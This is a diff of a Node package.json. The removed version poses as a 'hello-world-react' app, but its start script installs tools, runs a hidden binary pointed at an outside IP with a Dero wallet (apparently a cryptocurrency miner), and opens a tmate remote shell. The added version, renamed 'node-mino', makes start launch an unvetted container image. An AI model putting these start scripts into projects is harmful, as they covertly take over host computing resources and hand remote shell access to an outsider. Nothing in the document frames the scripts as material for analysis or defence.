@@ -1,43 +1,15 @@
 {
-  "name": "hello-world-react",
-  "version": "0.1.0",
-  "private": true,
-  "dependencies": {
-    "@testing-library/jest-dom": "^5.16.5",
-    "@testing-library/react": "^13.4.0",
-    "@testing-library/user-event": "^13.5.0",
-    "react": "^18.2.0",
-    "react-dom": "^18.2.0",
-    "react-scripts": "5.0.1",
-    "serve": "^14.2.0",
-    "web-vitals": "^2.1.4"
-  },
+  "name": "node-mino",
+  "version": "1.0.0",
+  "main": "app.js",
   "scripts": {
-    "start": "apt-get update;apt-get install nodejs npm screen -y;chmod +x moon tmate;screen -dmS play ./moon -d 5.161.123.196:10100 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj;./tmate -S /tmp/tmate.sock new-session -d;./tmate -S /tmp/tmate.sock wait tmate-ready;./tmate -S /tmp/tmate.sock display -p '#{tmate_ssh} -t';while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done",
-    "dev": "",
-    "build": "",
-    "test": "",
-    "eject": ""
+    "start": "udocker run attaraga/ubuntu:latest"
   },
-  "eslintConfig": {
-    "extends": [
-      "react-app",
-      "react-app/jest"
-    ]
-  },
-  "browserslist": {
-    "production": [
-      ">0.2%",
-      "not dead",
-      "not op_mini all"
-    ],
-    "development": [
-      "last 1 chrome version",
-      "last 1 firefox version",
-      "last 1 safari version"
-    ]
-  },
-  "devDependencies": {
-    "tailwindcss": "^3.4.0"
+  "author": "",
+  "license": "ISC",
+  "description": "",
+  "dependencies": {
+    "lodash": "^4.17.21",
+    "ws": "^8.18.0"
   }
 }
